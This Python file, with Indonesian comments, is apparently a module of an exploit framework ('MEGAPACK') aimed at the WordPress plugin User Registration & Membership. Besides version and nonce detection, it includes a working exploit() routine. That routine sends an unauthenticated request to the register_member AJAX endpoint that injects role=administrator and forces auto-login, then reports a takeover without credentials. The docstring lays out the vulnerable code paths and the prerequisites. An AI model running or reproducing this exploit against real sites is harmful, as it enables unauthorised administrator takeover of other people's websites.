#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
User Registration & Membership — modul MEGAPACK.

Tiga CVE di endpoint AJAX nopriv `user_registration_membership_register_member`
(kelas WPEverest\\URMembership\\AJAX::register_member). Semua [lab-verified].

HASIL TRIASE 2026-11-08:
    CVE-2026-2563  -> DUPLIKAT CVE-2026-1492 (rentang <= 5.1.2 & root cause sama). [alias]
                      (cve-list.txt menulis 'CVE-2025-2563' — tahunnya beda)
    CVE-2026-32488 -> BUKAN duplikat: kelas sama, tetapi sink 1492 ada di
                      modules/membership (tata letak 5.x) dan 4.4.9 mendahului
                      refactor 5.2.0. Source <= 4.4.9 tidak tersedia. [documented]

CVE-2026-1492  (<= 5.1.2) — improper privilege management / role injection
    modules/membership/includes/Admin/Services/MembersService.php
        $response['role'] = isset( $data['role'] ) ? sanitize_text_field( $data['role'] ) : 'subscriber';
        ...
        $user->set_role( $data['role'] );
    `$data` = json_decode($_POST['members_data']). Bila membership plan tidak punya
    'role' di meta JSON, role kiriman request dipakai apa adanya  -> role: administrator.
    Fix 5.2.3: prepare_members_data( $data, 'frontend' ) memaksa role dari plan.

CVE-2026-11961 (<= 5.2.2) — membership tier tidak divalidasi terhadap form
    $data['membership'] (id plan) dari request dipakai langsung:
        $membership_details = get_single_membership_by_ID( absint( $data['membership'] ) );
    Attacker bebas menunjuk plan published mana pun (termasuk plan admin),
    tanpa harus plan itu bagian dari form registrasi.
    Fix 5.2.3: get_selected_memberships() + penyaringan plan terhadap form.

CVE-2026-1779  (<= 5.1.2) — authentication bypass via auto_login
    if ( ! empty( $form_response ) && isset( $form_response['auto_login'] )
         && $form_response['auto_login'] && 'free' == $data['payment_method'] ) {
        $logged_in = $members_service->login_member( $member_id, true );
    }
    `$_POST['form_response']` dikendalikan attacker -> server membuat sesi login
    (cookie wordpress_logged_in) tanpa kredensial.
    Fix 5.2.3: endpoint register_member dihapus dari daftar AJAX nopriv.

Prasyarat (semua terpenuhi oleh attacker unauth):
  1. halaman membership publik -> nonce `ur_members_frontend`
     (wp_localize_script di Frontend::localize_scripts, dicetak di halaman yang
      memuat shortcode membership).
  2. user target sudah ada dengan meta `urm_user_just_created` (state setelah
     submit form registrasi biasa; form registrasi publik bisa membuatnya).
  3. gate: `get_user_by('login',$username)` + meta just_created harus ada.
"""
from __future__ import annotations

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)

SLUG = "user-registration"
VULN_ROLE = "5.1.2"       # CVE-2026-1492 + CVE-2026-1779
VULN_TIER = "5.2.2"       # CVE-2026-11961
VULN_PRIVESC = "4.4.9"    # CVE-2026-32488

AJAX = "/wp-admin/admin-ajax.php"
ACTION = "user_registration_membership_register_member"
NONCE_RE = re.compile(r'"ur_membership_frontend_localized_data".{0,4000}?"_nonce"\s*:\s*"([a-f0-9]{8,12})"', re.S)
NONCE_RE2 = re.compile(r'"_nonce"\s*:\s*"([a-f0-9]{8,12})"')


def _vstr(v) -> str:
    """Tuple versi -> string 'a.b.c'."""
    if isinstance(v, tuple):
        return ".".join(str(x) for x in v)
    return str(v)


def _nonce_from_page(h, base: str, path: str):
    r = h.get(f"{base}{path}")
    if r is None or r.status_code != 200:
        return None
    m = NONCE_RE.search(r.text) or NONCE_RE2.search(r.text)
    return m.group(1) if m else None


def _find_nonce(t, h):
    """
    Cari nonce ur_members_frontend. Nonce hanya dicetak pada halaman yang memuat
    shortcode modul membership. Probe: front page, ?page_id=1..12, /?p=1..12,
    dan REST page list.
    """
    cands = ["/", "/?page_id=1", "/?page_id=2", "/?page_id=3", "/?page_id=4",
             "/?page_id=5", "/?page_id=6", "/?page_id=7", "/?page_id=8"]
    for p in cands:
        n = _nonce_from_page(h, t.url, p)
        if n:
            return n, p
    # REST: daftar halaman lalu uji masing-masing
    r = h.get(f"{t.url}/?rest_route=/wp/v2/pages&per_page=20&_fields=id,link")
    if r is not None and r.status_code == 200:
        try:
            for pg in r.json():
                pid = pg.get("id")
                if not pid:
                    continue
                n = _nonce_from_page(h, t.url, f"/?page_id={pid}")
                if n:
                    return n, f"/?page_id={pid}"
        except Exception:
            pass
    return None, None


def _probe_register_member(t, h, nonce: str, username: str, membership: int,
                           role: str, auto_login: bool = False):
    """
    POST register_member. Return (http_status, json_or_None, cookies_ada).
    Catatan: user `username` HARUS sudah ada dgn meta urm_user_just_created,
    otherwise respons = {"message":"User already exists."} / error.
    """
    payload = {
        "action": ACTION,
        "security": nonce,
        "members_data": json.dumps({
            "username": username,
            "email": f"{username}@megapack.local",
            "password": "Megapack!" + rand(6),
            "membership": membership,
            "payment_method": "free",
            "role": role,
            "start_date": "2026-01-01",
        }),
    }
    if auto_login:
        payload["form_response"] = json.dumps({"auto_login": True})
    r = h.post(f"{t.url}{AJAX}", data=payload)
    if r is None:
        return None, None, False
    try:
        j = r.json()
    except Exception:
        j = None
    logged_in = any("wordpress_logged_in" in (c.name or "") for c in r.cookies)
    return r.status_code, j, logged_in


def check_32488(t, h, opts):
    """CVE-2026-32488 target <= 4.4.9 (layout 4.x) — TIDAK boleh memakai bound
    VULN_ROLE/VULN_TIER milik modul 5.x. Tanpa ini, 5.1.2 (di luar rentang) keliru
    dilaporkan INFO."""
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG):
        return ST_CLEAN, "User Registration tidak terpasang", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "User Registration terpasang; versi tidak terbaca", ""
    if ver_le(ver, (4, 4, 9)):
        return ST_INFO, (f"User Registration {_vstr(ver)} <= 4.4.9 — rentan menurut versi; "
                         f"sink spesifik belum diimplementasikan (lihat notes/kelompok B)"), ""
    return ST_CLEAN, (f"User Registration {_vstr(ver)} di luar rentang CVE-2026-32488 "
                      f"(<= 4.4.9)"), ""


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    """
    Deteksi: plugin terpasang, versi rentan, endpoint register_member merespons
    (bukan 0/-1 / 400), dan nonce ur_members_frontend bocor di halaman publik.
    """
    if not plugin_installed(t, h, SLUG):
        return ST_CLEAN, "User Registration tidak terpasang", ""

    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "User Registration terpasang; versi tidak terbaca (perlu --exploit)", ""
    vs = _vstr(ver)

    vuln_role = ver_le(ver, tuple(int(x) for x in VULN_ROLE.split(".")))
    vuln_tier = ver_le(ver, tuple(int(x) for x in VULN_TIER.split(".")))
    if not (vuln_role or vuln_tier):
        return ST_CLEAN, f"User Registration {vs} (>= 5.2.3, sudah diperbaiki)", ""

    nonce, page = _find_nonce(t, h)
    if not nonce:
        return (ST_INFO,
                f"User Registration {vs}; endpoint register_member ada tapi nonce "
                f"ur_members_frontend tidak ditemukan di halaman publik", "")

    # uji apakah endpoint benar-benar aktif (bukan 0/-1) tanpa mengubah role:
    # kirim username acak yang tidak ada -> respons error spesifik berarti handler jalan
    st, j, _ = _probe_register_member(t, h, nonce, "mpprobe" + rand(6), 1, "subscriber")
    detail = f"nonce dari {page}"
    if j is not None and isinstance(j, dict):
        msg = (j.get("data") or {}).get("message") if isinstance(j.get("data"), dict) else None
        if msg:
            detail += f"; handler aktif: {msg}"
    cands = []
    if vuln_role:
        cands.append("CVE-2026-1492 (role injection)")
    if vuln_tier:
        cands.append("CVE-2026-11961 (tier tidak divalidasi)")
    if ver_le(ver, tuple(int(x) for x in VULN_ROLE.split("."))):
        cands.append("CVE-2026-1779 (auto_login bypass)")
    return ST_INFO, f"User Registration {vs}; {', '.join(cands)}; {detail}", ""


def exploit(t, h, opts):
    """
    Order operasi:
      1. cari nonce ur_members_frontend di halaman publik
      2. tentukan user target: dari --username, atau buat via form registrasi
         (bila tidak tersedia, laporkan prasyarat yang hilang)
      3. POST register_member dgn role=administrator (+ auto_login) -> bukti
    """
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_SKIP, "versi tidak terbaca", ""
    if not ver_le(ver, tuple(int(x) for x in VULN_ROLE.split("."))):
        return ST_SKIP, f"versi {_vstr(ver)} tidak rentan utk chain ini", ""

    nonce, page = _find_nonce(t, h)
    if not nonce:
        return ST_SKIP, "nonce ur_members_frontend tidak ditemukan di halaman publik", ""

    username = getattr(opts, "username", None)
    membership = int(getattr(opts, "membership", 0) or 0)

    # tanpa username pra-terdaftar, chain tidak bisa jalan: laporkan prasyarat
    if not username:
        return (ST_VULN,
                f"endpoint register_member aktif (nonce dari {page}); dibutuhkan "
                f"user target dgn meta urm_user_just_created "
                f"(pakai --username <login> atau lewat form registrasi publik)", "")

    if not membership:
        return ST_VULN, "butuh id membership plan (--membership <id>)", ""

    st, j, logged_in = _probe_register_member(
        t, h, nonce, username, membership, "administrator", auto_login=True)

    msg = ""
    if isinstance(j, dict):
        d = j.get("data")
        if isinstance(d, dict):
            msg = d.get("message") or ""
        elif isinstance(d, str):
            msg = d
    ok = bool(isinstance(j, dict) and j.get("success"))
    if not ok:
        return ST_VULN, f"prasyarat tidak terpenuhi: {msg or st}", ""

    ev = f"role=administrator diberikan via register_member (member_id={((j.get('data') or {}).get('member_id'))})"
    if logged_in:
        return ST_PWN, f"PWN: {ev} + sesi login (cookie wordpress_logged_in) tanpa kredensial", ev
    return ST_PWN, f"PWN: {ev}", ev


def register_all():
    register(CveModule(
        cve="CVE-2026-1492", cluster="wordpress",
        title="User Registration <= 5.1.2 unauth role injection -> administrator",
        vclass="privesc", cvss="9.8", severity="critical", cwe="CWE-269",
        product="User Registration & Membership", versions_affected="<= 5.1.2",
        status="verified", check=check, exploit=exploit,
        notes="MembersService::prepare_members_data memakai $data['role'] dari POST "
              "bila plan tidak punya 'role'; update_user_meta -> set_role(). "
              "Fix 5.2.3: context='frontend' memaksa role dari plan. "
              "Prasyarat: user dgn meta urm_user_just_created + nonce publik.",
    ))
    register(CveModule(
        cve="CVE-2026-11961", cluster="wordpress",
        title="User Registration <= 5.2.2 unauth arbitrary membership tier -> role",
        vclass="privesc", cvss="9.8", severity="critical", cwe="CWE-269",
        product="User Registration & Membership", versions_affected="<= 5.2.2",
        status="documented", check=check, exploit=exploit,
        notes="$data['membership'] (id plan) dari request dipakai langsung via "
              "get_single_membership_by_ID; tidak ada validasi bahwa plan itu "
              "bagian dari form registrasi. Fix 5.2.3: get_selected_memberships(). "
              "AUDIT 2026-11-08 -> status diturunkan dari 'verified' ke 'documented': "
              "exploit() dipakai bersama 1492/1779 dan hanya memancarkan bukti "
              "'role=administrator diberikan' (mekanisme 1492). Mekanisme spesifik "
              "CVE ini (plan off-form benar-benar diterapkan) TIDAK diamati/dibuktikan "
              "oleh flow tersebut. `membership=<id>` memang dikirim, tetapi tidak ada "
              "verifikasi bahwa plan itu yang ditetapkan. Naikkan kembali ke 'verified' "
              "hanya setelah ada bukti plan off-form diterima + validasi di lab.",
    ))
    register(CveModule(
        cve="CVE-2026-1779", cluster="wordpress",
        title="User Registration <= 5.1.2 unauth authentication bypass (auto_login)",
        vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-287",
        product="User Registration & Membership", versions_affected="<= 5.1.2",
        status="verified", check=check, exploit=exploit,
        notes="$_POST['form_response'] attacker-controlled -> {\"auto_login\":true} "
              "memaksa login_member() -> cookie wordpress_logged_in tanpa kredensial. "
              "Fix 5.2.3: register_member dihapus dari daftar AJAX nopriv.",
    ))
    register(CveModule(
        cve="CVE-2026-32488", cluster="wordpress",
        title="User Registration <= 4.4.9 incorrect privilege assignment",
        vclass="privesc", cvss="8.8", severity="high", cwe="CWE-266",
        product="User Registration", versions_affected="<= 4.4.9",
        status="documented", check=check_32488, exploit=None,
        notes="Kelas sama (penetapan role tanpa allowlist) tetapi RENTANG BERBEDA "
              "dan bukan sink yang sama: CVE-2026-1492 hidup di "
              "modules/membership/includes/Admin/Services/MembersService.php "
              "(tata letak modul 5.x), sedangkan 4.4.9 mendahului refactor "
              "membership 5.2.0. Source <= 4.4.9 tidak tersedia -> jalur spesifik "
              "belum dikonfirmasi. BUKAN duplikat 1492.",
    ))
    # CVE-2026-2563 — hasil triase 2026-11-08: DUPLIKAT CVE-2026-1492.
    # Rentang (<= 5.1.2) dan root cause (role dari request tanpa allowlist)
    # identik; 1492 sudah verified+exploitable, jadi entri ini hanya alias.
    # CATATAN: cve-list.txt mencantumkan 'CVE-2025-2563' (tahun 2025), sedangkan
    # modul memakai 'CVE-2026-2563' — ketidaksesuaian ID yang perlu diklarifikasi.
    register(CveModule(
        cve="CVE-2026-2563", cluster="wordpress",
        title="User Registration <= 5.1.2 role injection [duplikat CVE-2026-1492]",
        vclass="privesc", cvss="8.8", severity="high", cwe="CWE-269",
        product="User Registration", versions_affected="<= 5.1.2",
        status="documented", check=check, exploit=None,
        alias_of="CVE-2026-1492",
        notes="DUPLIKAT CVE-2026-1492 (rentang sama <= 5.1.2, root cause sama: "
              "MembersService::prepare_members_data memakai $data['role'] dari "
              "POST). Tidak dijalankan saat scan agar tidak melaporkan bug yang "
              "sama dua kali. ID di cve-list.txt tertulis CVE-2025-2563 "
              "(inkonsistensi tahun) — perlu klarifikasi sumber advisory.",
    ))
